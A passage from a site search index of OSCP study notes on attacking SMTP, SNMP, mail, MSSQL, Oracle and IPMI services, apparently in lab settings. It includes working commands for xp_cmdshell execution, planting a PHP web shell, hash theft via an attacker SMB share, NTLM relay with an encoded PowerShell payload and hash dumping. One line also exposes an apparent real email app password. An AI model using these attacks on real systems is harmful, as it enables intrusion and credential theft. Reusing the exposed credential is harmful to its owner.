RCE. It has been exploitable since 2018. This service has been used in many different Linux distributions, such as Debian, Fedora, FreeBSD, and others. The dangerous thing about this vulnerability is the possibility of executing system commands remotely on the system and that exploiting this vulnerability does not require authentication.",
    "description": "Step Tool/Command Purpose Port + Banner check nmap -p 25 --script=smtp* \u003cip\u003e Service \u0026 vuln info Open relay test nmap -p 25 --script=smtp-open-relay \u003cip\u003e Check relay status User enumeration nmap -p 25 --script=smtp-enum-users \u003cip\u003e Find valid users Send test mail swaks --to victim@domain.com --server \u003cip\u003e Test open relay/send mail irfan@irfan-VirtualBox:~$ sudo nmap 127.0.0.1 -sC -sV -p25\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-05 16:00 EST\nNmap scan report for localhost (127.",
    "tags": [],
    "title": "smtp",
    "uri": "/oscp-notes/smtp/index.html"
  },
  {
    "breadcrumb": "DrakonOps¬†\u003e¬†OSCP Notes",
    "content": "Dangerous Settings Some dangerous settings that the administrator can make with SNMP are:\nSettings Description rwuser noauth Provides access to the full OID tree without authentication. rwcommunity \u003ccommunity string\u003e \u003cIPv4 address\u003e Provides access to the full OID tree regardless of where the requests were sent from. rwcommunity6 \u003ccommunity string\u003e \u003cIPv6 address\u003e Same access as with rwcommunity with the difference of using IPv6. https://secf00tprint.github.io/blog/passwords/crunch/advanced/en\nGet the community strings\ncube111@local[/local]$ sudo apt install onesixtyone cube111@local[/local]$ onesixtyone -c /opt/useful/seclists/Discovery/SNMP/snmp.txt 10.129.14.128 Scanning 1 hosts, 3220 communities 10.129.14.128 [public] Linux local 5.11.0-37-generic #41~20.04.2-Ubuntu SMP Fri Sep 24 09:06:38 UTC 2021 x86_64 cube111@local[/local]$ sudo apt install braa cube111@local[/local]$ braa \u003ccommunity string\u003e@\u003cIP\u003e:.1.3.6.* # Syntax cube111@local[/local]$ braa public@10.129.14.128:.1.3.6.* 10.129.14.128:20ms:.1.3.6.1.2.1.1.1.0:Linux local 5.11.0-34-generic #36~20.04.1-Ubuntu SMP Fri Aug 27 08:06:32 UTC 2021 x86_64 10.129.14.128:20ms:.1.3.6.1.2.1.1.2.0:.1.3.6.1.4.1.8072.3.2.10 10.129.14.128:20ms:.1.3.6.1.2.1.1.3.0:548 10.129.14.128:20ms:.1.3.6.1.2.1.1.4.0:mrb3n@inlanefreight.local 10.129.14.128:20ms:.1.3.6.1.2.1.1.5.0:local 10.129.14.128:20ms:.1.3.6.1.2.1.1.6.0:US 10.129.14.128:20ms:.1.3.6.1.2.1.1.7.0:78 sudo nmap -sU -p161 ‚Äìscript *snmp* $target\nsnmpwalk -v1 -c public 10.129.220.235 | tee snmp-output.txt¬†things learnt :¬†Review everything carefully from snmpwalk output",
    "description": "Dangerous Settings Some dangerous settings that the administrator can make with SNMP are:\nSettings Description rwuser noauth Provides access to the full OID tree without authentication. rwcommunity \u003ccommunity string\u003e \u003cIPv4 address\u003e Provides access to the full OID tree regardless of where the requests were sent from. rwcommunity6 \u003ccommunity string\u003e \u003cIPv6 address\u003e Same access as with rwcommunity with the difference of using IPv6. https://secf00tprint.github.io/blog/passwords/crunch/advanced/en\nGet the community strings\ncube111@local[/local]$ sudo apt install onesixtyone cube111@local[/local]$ onesixtyone -c /opt/useful/seclists/Discovery/SNMP/snmp.",
    "tags": [],
    "title": "snmp",
    "uri": "/oscp-notes/snmp/index.html"
  },
  {
    "breadcrumb": "DrakonOps¬†\u003e¬†OSCP Notes",
    "content": "¬†sudo nmap 10.129.14.128 -sV -p110,143,993,995 -sC Port Service TCP/25 SMTP Unencrypted TCP/143 IMAP4 Unencrypted TCP/110 POP3 Unencrypted TCP/465 SMTP Encrypted TCP/587 SMTP Encrypted/STARTTLS TCP/993 IMAP4 Encrypted TCP/995 POP3 Encrypted openssl s_client -connect 142.251.163.109:993 -tls1_2 -crlf\nopenssl s_client -connect 10.129.14.128:imaps curl -k 'imaps://10.129.14.128' --user cry0l1t3:1234 -v curl -k ‚Äìurl ‚Äòimaps://142.251.163.109‚Äô ‚Äìuser ‚Äúirfshaik111@gmail.com:vyyi nrpz pjos kqnt‚Äù\nIMAP Commands Command Description 1 LOGIN username password User‚Äôs login. 1 LIST \"\" * Lists all directories. 1 CREATE \"INBOX\" Creates a mailbox with a specified name. 1 DELETE \"INBOX\" Deletes a mailbox. 1 RENAME \"ToRead\" \"Important\" Renames a mailbox. 1 LSUB \"\" * Returns a subset of names from the set of names that the User has declared as being active or subscribed. 1 SELECT INBOX Selects a mailbox so that messages in the mailbox can be accessed. 1 UNSELECT INBOX Exits the selected mailbox. 1 FETCH \u003cID\u003e all Retrieves data associated with a message in the mailbox. 1 CLOSE Removes all messages with the Deleted flag set. 1 LOGOUT Closes the connection with the IMAP server. *********A004 UID SEARCH ALL\nA3 FETCH 1 BODY[TEXT]\nPOP3 Commands openssl s_client -connect 10.129.14.128:pop3s Command Description USER username Identifies the user. PASS password Authentication of the user using its password. STAT Requests the number of saved emails from the server. LIST Requests from the server the number and size of all emails. RETR id Requests the server to deliver the requested email by ID. DELE id Requests the server to delete the requested email by ID. CAPA Requests the server to display the server capabilities. RSET Requests the server to reset the transmitted information. QUIT Closes the connection with the POP3 server. USER Command [!bash!]$ telnet 10.10.110.20 110 Trying 10.10.110.20... Connected to 10.10.110.20. Escape character is '^]'. +OK POP3 Server ready USER julio -ERR USER john +OK Video - Connecting to IMAP and SMTP using Evolution Click on the image below to see a short video demonstration.",
    "description": "sudo nmap 10.129.14.128 -sV -p110,143,993,995 -sC Port Service TCP/25 SMTP Unencrypted TCP/143 IMAP4 Unencrypted TCP/110 POP3 Unencrypted TCP/465 SMTP Encrypted TCP/587 SMTP Encrypted/STARTTLS TCP/993 IMAP4 Encrypted TCP/995 POP3 Encrypted openssl s_client -connect 142.251.163.109:993 -tls1_2 -crlf\nopenssl s_client -connect 10.129.14.128:imaps curl -k 'imaps://10.129.14.128' --user cry0l1t3:1234 -v curl -k ‚Äìurl ‚Äòimaps://142.251.163.109‚Äô ‚Äìuser ‚Äúirfshaik111@gmail.com:vyyi nrpz pjos kqnt‚Äù\nIMAP Commands Command Description 1 LOGIN username password User‚Äôs login. 1 LIST \"\" * Lists all directories.",
    "tags": [],
    "title": "imap and pop",
    "uri": "/oscp-notes/imap-and-pop/index.html"
  },
  {
    "breadcrumb": "DrakonOps¬†\u003e¬†OSCP Notes",
    "content": "MSSQL default system schemas/databases:\nmaster - keeps the information for an instance of SQL Server. msdb - used by SQL Server Agent. model - a template database copied for each new database. resource - a read-only database that keeps system objects visible in every database on the server in sys schema. tempdb - keeps temporary objects for SQL queries Privileges Depending on the user‚Äôs privileges, we may be able to perform different actions within a SQL Server, such as:\nRead or change the contents of a database\nRead or change the server configuration\nExecute commands\nRead local files\nCommunicate with other databases\nCapture the local system hash\nImpersonate existing users\nGain access to other networks\nIn this section, we will explore some of these attacks.\nMSSQL Databases MSSQL has default system databases that can help us understand the structure of all the databases that may be hosted on a target server. Here are the default databases and a brief description of each:\nDefault System Database Description master Tracks all system information for an SQL server instance model Template database that acts as a structure for every new database created. Any setting changed in the model database will be reflected in any new database created after changes to the model database msdb The SQL Server Agent uses this database to schedule jobs \u0026 alerts tempdb Stores temporary objects resource Read-only database containing system objects included with SQL server export KRB5CCNAME=/tmp/krb5cc_0\npython3 mssqlclient.py -windows-auth -k DOMAIN/user@ip\ncube111@local[/local]$ sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 10.129.201.248 msf6 auxiliary(scanner/mssql/mssql_ping) \u003e set rhosts 10.129.201.248 rhosts =\u003e 10.129.201.248 msf6 auxiliary(scanner/mssql/mssql_ping) \u003e run [*] 10.129.201.248: - SQL Server information for 10.129.201.248: [+] 10.129.201.248: - ServerName = SQL-01 [+] 10.129.201.248: - InstanceName = MSSQLSERVER [+] 10.129.201.248: - IsClustered = No [+] 10.129.201.248: - Version = 15.0.2000.5 [+] 10.129.201.248: - tcp = 1433 [+] 10.129.201.248: - np = \\SQL-01\\pipe\\sql\\query [*] 10.129.201.248: - Scanned 1 of 1 hosts (100% complete) [*] Auxiliary module exe SQL\u003e select name from sys.databases; SELECT name FROM sys.sysdatabases; //show databases use databasename; select name from sys.tables //list show tables select * from tb_flag; /print out table MSSQL CONNECT FROM LINUX\ncube111@local[/local]$ mssqlclient.py -p 1433 julio@10.129.203.7 mssqlclient.py Administrator@10.129.201.248 -windows-auth sqsh -S 10.129.203.7 -U julio -P 'MyPassword!' -h cube111@local[/local]$ sqsh -S 10.129.203.7 -U .\\julio -P 'MyPassword!' -h From windows Sqlcmd - Connecting to the SQL Server Attacking SQL Databases\nC:\\local\u003e sqlcmd -S SRVMSSQL -U julio -P 'MyPassword!' -y 30 -Y 30 1\u003e If we use sqlcmd, we will need to use GO after our query to execute the SQL syntax.\nTo interact with MSSQL (Microsoft SQL Server) with Linux we can use sqsh or sqlcmd if you are using Windows\n==Command execution==\n1. Check Current Configuration Run this first to see if xp_cmdshell is already enabled:\nEXEC sp_configure ‚Äòxp_cmdshell‚Äô;\nIf config_value = 0, it‚Äôs disabled. If config_value = 1, it‚Äôs enabled. 2. Enable Advanced Options By default, SQL Server hides advanced configuration options. Enable them with:\nEXEC sp_configure ‚Äòshow advanced options‚Äô, 1;\nRECONFIGURE;\n3. Enable xp_cmdshell Now enable xp_cmdshell\nEXEC sp_configure ‚Äòxp_cmdshell‚Äô, 1;\nRECONFIGURE;\nWe could then choose enable_xp_cmdshell to enable the xp_cmdshell stored procedure which allows for one to execute operating system commands via the database if the account in question has the proper access rights.\nAttacking SQL Databases\n1\u003e xp_cmdshell 'whoami' 2\u003e GO output ----------------------------- no service\\mssql$sqlexpress NULL (2 rows affected) Windows - SQLCMD C:\\local\u003e sqlcmd -S 10.129.20.13 -U username -P Password123 Write Local File MSSQL - Enable Ole Automation Procedures Attacking SQL Databases\n1\u003e sp_configure 'show advanced options', 1 2\u003e GO 3\u003e RECONFIGURE 4\u003e GO 5\u003e sp_configure 'Ole Automation Procedures', 1 6\u003e GO 7\u003e RECONFIGURE 8\u003e GO MSSQL - Create a File Attacking SQL Databases\n1\u003e DECLARE @OLE INT 2\u003e DECLARE @FileID INT 3\u003e EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT 4\u003e EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\\inetpub\\wwwroot\\webshell.php', 8, 1 5\u003e EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '\u003c?php echo shell_exec($_GET[\"c\"]);?\u003e' 6\u003e EXECUTE sp_OADestroy @FileID 7\u003e EXECUTE sp_OADestroy @OLE 8\u003e GO Read Local Files in MSSQL Attacking SQL Databases\n1\u003e SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents 2\u003e GO BulkColumn ----------------------------------------------------------------------------- # Copyright (c) 1993-2009 Microsoft Corp. # # This is a sample HOSTS file used by Microsoft TCP/IP for Windows. # # This file contains the mappings of IP addresses to hostnames. Each # entry should be kept on an individual line. The IP address should (1 rows affected) Capture MSSQL Service Hash XP_DIRTREE Hash Stealing Attacking SQL Databases\n1\u003e EXEC master..xp_dirtree('\\\\10.10.110.17\\share\\u0027) 2\u003e GO subdirectory depth --------------- ----------- on older systems\nXP_SUBDIRS Hash Stealing Attacking SQL Databases\n1\u003e EXEC master..xp_subdirs('\\\\10.10.110.17\\share\\u0027) 2\u003e GO HResult 0x55F6, Level 16, State 1 xp_subdirs could not access '\\\\10.10.110.17\\share\\*.*\\u0027: FindFirstFile() returned error 5, 'Access is de XP_SUBDIRS Hash Stealing with Responder Attacking SQL Databases\ncube111@local[/local]$ sudo responder -I tun0 XP_SUBDIRS Hash Stealing with impacket Attacking SQL Databases\ncube111@local[/local]$ sudo impacket-smbserver share ./ -smb2support Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation [*] Config file parsed [*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0 [*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0 [*] Config file parsed [*] Config file parsed [*] Config file parsed [*] Incoming connection (10.129.203.7,49728) [*] AUTHENTICATE_MESSAGE (WINSRV02\\mssqlsvc,WINSRV02) [*] User WINSRV02\\mssqlsvc authenticated successfully [*] demouser::WIN7BOX:5e3ab1c4380b94a1:A18830632D52768440B7E2425C4A7107:0101000000000000009BFFB9DE3DD801D5448EF4D0BA034D0000000002000800510053004700320001001E00570049004E002D003500440050005A0033005200530032004F005800320004003400570049004E002D003500440050005A0033005200530032004F00580013456F0051005300470013456F004C004F00430041004C000300140051005300470013456F004C004F00430041004C000500140051005300470013456F004C004F00430041004C0007000800009BFFB9DE3DD801060004000200000008003000300000000000000000100000000200000ADCA14A9054707D3939B6A5F98CE1F6E5981AC62CEC5BEAD4F6200A35E8AD9170A0010000000000000000000000000000000000009001C0063006900660073002F00740065007300740069006E006700730061000000000000000000 [*] Closing down connection (10.129.203.7,49728) [*] Remaining connections [] NTLM RELAY\ncube111@local[/local]$ impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBq sudo ntlmrelayx.py -t smb://192.168.220.146 -smb2support --shell Impersonate Existing Users with MSSQL Identify Users that We Can Impersonate Attacking SQL Databases\n1\u003e SELECT distinct b.name 2\u003e FROM sys.server_permissions a 3\u003e INNER JOIN sys.server_principals b 4\u003e ON a.grantor_principal_id = b.principal_id 5\u003e WHERE a.permission_name = 'IMPERSONATE' 6\u003e GO name ----------------------------------------------- sa ben valentin (3 rows affected) Verifying our Current User and Role Attacking SQL Databases\n1\u003e SELECT SYSTEM_USER 2\u003e SELECT IS_SRVROLEMEMBER('sysadmin') 3\u003e go ----------- julio (1 rows affected) ----------- 0 (1 rows affected) 1\u003e EXECUTE AS LOGIN = 'sa' 2\u003e SELECT SYSTEM_USER 3\u003e SELECT IS_SRVROLEMEMBER('sysadmin') 4\u003e GO ----------- sa (1 rows affected) ----------- 1 (1 rows affected) Note: It‚Äôs recommended to run EXECUTE AS LOGIN within the master DB, because all users, by default, have access to that database. If a user you are trying to impersonate doesn‚Äôt have access to the DB you are connecting to it will present an error. Try to move to the master DB using USE master.\nWe can now execute any command as a sysadmin as the returned value 1 indicates. To revert the operation and return to our previous user, we can use the Transact-SQL statement REVERT.\nNote: If we find a user who is not sysadmin, we can still check if the user has access to other databases or linked servers.\nAs the returned value 0 indicates, we do not have the sysadmin role, but we can impersonate the sa user. Let us impersonate the user and execute the same commands. To impersonate a user, we can use the Transact-SQL statement EXECUTE AS LOGIN and set it to the user we want to impersonate.\nSQL Server Admin MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]-\u003e(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]-\u003e(c:Computer) RETURN p2 cypher query\nMATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]-\u003e(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]-\u003e(c:Computer) RETURN p2 Enumerating MSSQL Instances with PowerUpSQL Privileged Access\nPS C:\\local\u003e cd .\\PowerUpSQL\\ PS C:\\local\u003e Import-Module .\\PowerUpSQL.ps1 PS C:\\local\u003e Get-SQLInstanceDomain ComputerName : ACADEMY-EA-DB01.INLANEFREIGHT.LOCAL Instance : ACADEMY-EA-DB01.INLANEFREIGHT.LOCAL,1433 DomainAccountSid : 1500000521000170152142291832437223174127203170152400 DomainAccount : damundsen DomainAccountCn : Dana Amundsen Service : MSSQLSvc Spn : MSSQLSvc/ACADEMY-EA-DB01.INLANEFREIGHT.LOCAL:1433 LastLogon : 4/6/2022 11:59 AM PS C:\\local\u003e Get-SQLQuery -Verbose -Instance \"172.16.5.150,1433\" -username \"inlanefreight\\damundsen\" -password \"SQL1234!\" -query 'Select @@version' VERBOSE: 172.16.5.150,1433 : Connection Success. Column1 ------- Microsoft SQL Server 2017 (RTM) - 14.0.1000.169 (X64) ... Running mssqlclient.py Against the Target Privileged Access\ncube111@local[/local]$ mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation Password: [*] Encryption required, switching to TLS [*] ENVCHANGE(DATABASE): Old Value: master, New Value: master [*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english [*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192 [*] INFO(ACADEMY-EA-DB01\\SQLEXPRESS): Line 1: Changed database context to 'master'. [*] INFO(ACADEMY-EA-DB01\\SQLEXPRESS): Line 1: Changed language setting to us_english. [*] ACK: Result: 1 - Microsoft SQL Server (140 3232) [!] Press help for extra shell commands Enumerating our Rights on the System using xp_cmdshell Privileged Access\nxp_cmdshell whoami /priv output -------------------------------------------------------------------------------- NULL PRIVILEGES INFORMATION ---------------------- NULL Privilege Name Description State ============================= ========================================= ========== SeAssignPrimaryTokenPrivilege Replace a process level token Disabled SeIncreaseQuotaPrivilege Adjust memory quotas for a process Disabled SeChangeNotifyPrivilege Bypass traverse checking Enabled SeManageVolumePrivilege Perform volume maintenance tasks Enabled SeImpersonatePrivilege Impersonate a client after authentication Enabled SeCreateGlobalPrivilege Create global objects Enabled SeIncreaseWorkingSetPrivilege Increase a process working set Disabled NULL Communicate with Other Databases with MSSQL MSSQL has a configuration option called linked servers. Linked servers are typically configured to enable the database engine to execute a Transact-SQL statement that includes tables in another instance of SQL Server, or another database product such as Oracle.\nIf we manage to gain access to a SQL Server with a linked server configured, we may be able to move laterally to that database server. Administrators can configure a linked server using credentials from the remote server. If those credentials have sysadmin privileges, we may be able to execute commands in the remote SQL instance. Let‚Äôs see how we can identify and execute queries on linked servers.\nIdentify linked Servers in MSSQL Attacking SQL Databases\n1\u003e SELECT srvname, isremote FROM sysservers 2\u003e GO srvname isremote ---------------------------------- -------- DESKTOP-MFERMN4\\SQLEXPRESS 1 10.0.0.12\\SQLEXPRESS 0 (2 rows affected) As we can see in the query‚Äôs output, we have the name of the server and the column isremote, where 1 means is a remote server, and 0 is a linked server. We can see sysservers Transact-SQL for more information.\nNext, we can attempt to identify the user used for the connection and its privileges. The EXECUTE statement can be used to send pass-through commands to linked servers. We add our command between parenthesis and specify the linked server between square brackets ([ ]).\nAttacking SQL Databases\n1\u003e EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\\SQLEXPRESS] 2\u003e GO ------------------------------ ------------------------------ ------------------------------ ----------- DESKTOP-0L9D4KA\\SQLEXPRESS Microsoft SQL Server 2019 (RTM sa_remote 1 (1 rows affected) Note: If we need to use quotes in our query to the linked server, we need to use single double quotes to escape the single quote. To run multiples commands at once we can divide them up with a semi colon (;).\nAs we have seen, we can now execute queries with sysadmin privileges on the linked server. As sysadmin, we control the SQL Server instance. We can read data from any database or execute system commands with xp_cmdshell. This section covered some of the most common ways to attack SQL Server and MySQL databases during penetration testing engagements. There are other methods for attacking these database types as well as others, such as PostGreSQL, SQLite, Oracle, Firebase, and MongoDB which will be covered in other modules. It is worth taking some time to read up on these database technologies and some of the common ways to attack them as well.\nGUI Application Database engines commonly have their own GUI application. MySQL has MySQL Workbench and MSSQL has SQL Server Management Studio or SSMS, we can install those tools in our attack host and connect to the database. SSMS is only supported in Windows. An alternative is to use community tools such as dbeaver. dbeaver is a multi-platform database tool for Linux, macOS, and Windows that supports connecting to multiple database engines such as MSSQL, MySQL, PostgreSQL, among others, making it easy for us, as an attacker, to interact with common database servers.\nTo install dbeaver using a Debian package we can download the release .deb package from https://github.com/dbeaver/dbeaver/releases and execute the following command:\nInstall dbeaver [!bash!]$ sudo dpkg -i dbeaver-\u003cversion\u003e.deb To start the application use:\nRun dbeaver [!bash!]$ dbeaver \u0026 To connect to a database, we will need a set of credentials, the target IP and port number of the database, and the database engine we are trying to connect to (MySQL, MSSQL, or another).\nVideo - Connecting to MSSQL DB using dbeaver Click on the image below for a short video demonstration of connecting to an MSSQL database using dbeaver.",
    "description": "MSSQL default system schemas/databases:\nmaster - keeps the information for an instance of SQL Server. msdb - used by SQL Server Agent. model - a template database copied for each new database. resource - a read-only database that keeps system objects visible in every database on the server in sys schema. tempdb - keeps temporary objects for SQL queries Privileges Depending on the user‚Äôs privileges, we may be able to perform different actions within a SQL Server, such as:",
    "tags": [],
    "title": "mssql",
    "uri": "/oscp-notes/mssql/index.html"
  },
  {
    "breadcrumb": "DrakonOps¬†\u003e¬†OSCP Notes",
    "content": "Privileges Depending on the user‚Äôs privileges, we may be able to perform different actions within a SQL Server, such as:\nRead or change the contents of a database\nRead or change the server configuration\nExecute commands\nRead local files\nCommunicate with other databases\nCapture the local system hash\nImpersonate existing users\nGain access to other networks\nIn this section, we will explore some of these attacks.\nsudo nmap -p1521 -sV 10.129.204.235 --open find sid\ncube111@local[/local]$ sudo nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-06 11:01 EST Nmap scan report for 10.129.204.235 Host is up (0.0044s latency). PORT STATE SERVICE VERSION 1521/tcp open oracle-tns Oracle TNS listener 11.2.0.2.0 (unauthorized) | oracle-sid-brute: |_ XE Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 55.40 seconds brute force\ncube111@local[/local]$ ./odat.py all -s 10.129.204.235 [+] Checking if target 10.129.204.235:1521 is well configured for a connection... [+] According to a test, the TNS listener 10.129.204.235:1521 is well configured. Continue... ...SNIP... [!] Notice: 'mdsys' account is locked, so skipping this username for password #####################| ETA: 00:01:16 [!] Notice: 'oracle_ocm' account is locked, so skipping this username for password #####################| ETA: 00:01:05 [!] Notice: 'outln' account is locked, so skipping this username for password #####################| ETA: 00:00:59 [+] Valid credentials found: scott/tiger. Continue... ...SNIP... cube111@local[/local]$ ./odat.py -h usage: odat.py [-h] [--version] {all,tnscmd,tnspoison,sidguesser,snguesser,passwordguesser,utlhttp,httpuritype,utltcp,ctxsys,externaltable,dbmsxslprocessor,dbmsadvisor,utlfile,dbmsscheduler,java,passwordstealer,oradbg,dbmslob,stealremotepwds,userlikepwd,smb,privesc,cve,search,unwrapper,clean} ... if sql plus error occurs\ncube111@local[/local]$ sudo sh -c \"echo /usr/lib/oracle/12.2/client64/lib \u003e /etc/ld.so.conf.d/oracle-instantclient.conf\";sudo ldconfig cube111@local[/local]$ sqlplus scott/tiger@10.129.204.235/XE SQL*Plus: Release 21.0.0.0.0 - Production on Mon Mar 6 11:19:21 2023 Version 21.4.0.0.0 Copyright (c) 1982, 2021, Oracle. All rights reserved. ERROR: ORA-28002: the password will expire within 7 days Connected to: Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production SQL\u003e SQL\u003e select table_name from all_tables; TABLE_NAME ------------------------------ DUAL SYSTEM_PRIVILEGE_MAP TABLE_PRIVILEGE_MAP STMT_AUDIT_OPTION_MAP AUDIT_ACTIONS WRR$_REPLAY_CALL_FILTER HS_BULKLOAD_VIEW_OBJ HS$_PARALLEL_METADATA HS_PARTITION_COL_NAME HS_PARTITION_COL_TYPE HELP ...SNIP... SQL\u003e select * from user_role_privs; USERNAME GRANTED_ROLE ADM DEF OS_ ------------------------------ ------------------------------ --- --- --- SCOTT CONNECT NO YES NO SCOTT RESOURCE NO YES NO select table_name from all_tables; LOGIN aas admin\ncube111@local[/local]$ sqlplus scott/tiger@10.129.204.235/XE as sysdba SQL*Plus: Release 21.0.0.0.0 - Production on Mon Mar 6 11:32:58 2023 Version 21.4.0.0.0 Copyright (c) 1982, 2021, Oracle. All rights reserved. Connected to: Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production SQL\u003e select * from user_role_privs; USERNAME GRANTED_ROLE ADM DEF OS_ ------------------------------ ------------------------------ --- --- --- SYS ADM_PARALLEL_EXECUTE_TASK YES YES NO SYS APEX_ADMINISTRATOR_ROLE YES YES NO SYS AQ_ADMINISTRATOR_ROLE YES YES NO SYS AQ_USER_ROLE YES YES NO SYS AUTHENTICATEDUSER YES YES NO SYS CONNECT YES YES NO SYS CTXAPP YES YES NO SYS DATAPUMP_EXP_FULL_DATABASE YES YES NO SYS DATAPUMP_IMP_FULL_DATABASE YES YES NO SYS DBA YES YES NO SYS DBFS_ROLE YES YES NO USERNAME GRANTED_ROLE ADM DEF OS_ ------------------------------ ------------------------------ --- --- --- SYS DELETE_CATALOG_ROLE YES YES NO SYS EXECUTE_CATALOG_ROLE YES YES NO ...SNIP... SQL\u003e select name, password from sys.user$; NAME PASSWORD ------------------------------ ------------------------------ SYS FBA343E7D6C8BC9D PUBLIC CONNECT RESOURCE DBA SYSTEM B5073FE1DE351687 SELECT_CATALOG_ROLE EXECUTE_CATALOG_ROLE DELETE_CATALOG_ROLE OUTLN 4A3BA55E08595C81 EXP_FULL_DATABASE NAME PASSWORD ------------------------------ ------------------------------ IMP_FULL_DATABASE LOGSTDBY_ADMINISTRATOR ...SNIP... FILE UPLOADS\nOS Path Linux /var/www/html Windows C:\\inetpub\\wwwroot cube111@local[/local]$ echo \"Oracle File Upload Test\" \u003e testing.txt cube111@local[/local]$ ./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\\\inetpub\\\\wwwroot testing.txt ./testing.txt [1] (10.129.204.235:1521): Put the ./testing.txt local file in the C:\\\\inetpub\\\\wwwroot folder like testing.txt on the 10.129.204.235 server [+] The ./testing.txt file was created on the C:\\\\inetpub\\\\wwwroot directory on the 10.129.204.235 server like the testing.txt file Finally, we can test if the file upload approach worked with curl. Therefore, we will use a GET http://\u003cIP\u003e request, or we can visit via browser.\nOracle TNS\ncube111@local[/local]$ curl -X GET http://10.129.204.235/testing.txt Oracle File Upload Test GUI Application Database engines commonly have their own GUI application. MySQL has MySQL Workbench and MSSQL has SQL Server Management Studio or SSMS, we can install those tools in our attack host and connect to the database. SSMS is only supported in Windows. An alternative is to use community tools such as dbeaver. dbeaver is a multi-platform database tool for Linux, macOS, and Windows that supports connecting to multiple database engines such as MSSQL, MySQL, PostgreSQL, among others, making it easy for us, as an attacker, to interact with common database servers.\nTo install dbeaver using a Debian package we can download the release .deb package from https://github.com/dbeaver/dbeaver/releases and execute the following command:\nInstall dbeaver [!bash!]$ sudo dpkg -i dbeaver-\u003cversion\u003e.deb To start the application use:\nRun dbeaver [!bash!]$ dbeaver \u0026 To connect to a database, we will need a set of credentials, the target IP and port number of the database, and the database engine we are trying to connect to (MySQL, MSSQL, or another).\nVideo - Connecting to MSSQL DB using dbeaver Click on the image below for a short video demonstration of connecting to an MSSQL database using dbeaver.",
    "description": "Privileges Depending on the user‚Äôs privileges, we may be able to perform different actions within a SQL Server, such as:\nRead or change the contents of a database\nRead or change the server configuration\nExecute commands\nRead local files\nCommunicate with other databases\nCapture the local system hash\nImpersonate existing users\nGain access to other networks\nIn this section, we will explore some of these attacks.\nsudo nmap -p1521 -sV 10.",
    "tags": [],
    "title": "oracle databases TNS",
    "uri": "/oscp-notes/oracle-databases-tns/index.html"
  },
  {
    "breadcrumb": "DrakonOps¬†\u003e¬†OSCP Notes",
    "content": "Intelligent Platform Management Interface\n[!bash!]$ sudo nmap -sU --script ipmi-version -p 623 ilo.inlanfreight.local Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-04 21:48 GMT Nmap scan report for ilo.inlanfreight.local (172.16.2.2) Host is up (0.00064s latency). PORT STATE SERVICE 623/udp open asf-rmcp | ipmi-version: | Version: | IPMI-2.0 | UserAuth: | PassAuth: auth_user, non_null_user |_ Level: 2.0 MAC Address: 14:03:DC:674:18:6A (Hewlett Packard Enterprise) Nmap done: 1 IP address (1 host up) scanned in 0.46 seconds scan using msfconsole¬†msf6 \u003e use auxiliary/scanner/ipmi/ipmi_version msf6 auxiliary(scanner/ipmi/ipmi_version) \u003e set rhosts 10.129.42.195 msf6 auxiliary(scanner/ipmi/ipmi_version) \u003e show options Module options (auxiliary/scanner/ipmi/ipmi_version): Name Current Setting Required Description ---- --------------- -------- ----------- BATCHSIZE 256 yes The number of hosts to probe in each set RHOSTS 10.129.42.195 yes The target host(s), range CIDR identifier, or hosts file with syntax 'file:\u003cpath\u003e' RPORT 623 yes The target port (UDP) THREADS 10 yes The number of concurrent threads msf6 auxiliary(scanner/ipmi/ipmi_version) \u003e run [*] Sending IPMI requests to 10.129.42.195-\u003e10.129.42.195 (1 hosts) [+] 10.129.42.195:623 - IPMI - IPMI-2.0 UserAuth(auth_msg, auth_user, non_null_user) PassAuth(password, md5, md2, null) Level(1.5, 2.0) [*] Scanned 1 of 1 hosts (100% complete) [*] Auxiliary module execution completed Default passwords\nProduct Username Password Dell iDRAC root calvin HP iLO Administrator randomized 8-character string consisting of numbers and uppercase letters Supermicro IPMI ADMIN ADMIN exploiting RAKP protocol in IPMI 2.0\nMetasploit Dumping Hashes msf6 \u003e use auxiliary/scanner/ipmi/ipmi_dumphashes msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) \u003e set rhosts 10.129.42.195 msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) \u003e show options Module options (auxiliary/scanner/ipmi/ipmi_dumphashes): Name Current Setting Required Description ---- --------------- -------- ----------- CRACK_COMMON true yes Automatically crack common passwords as they are obtained OUTPUT_HASHCAT_FILE no Save captured password hashes in hashcat format OUTPUT_JOHN_FILE no Save captured password hashes in john the ripper format PASS_FILE 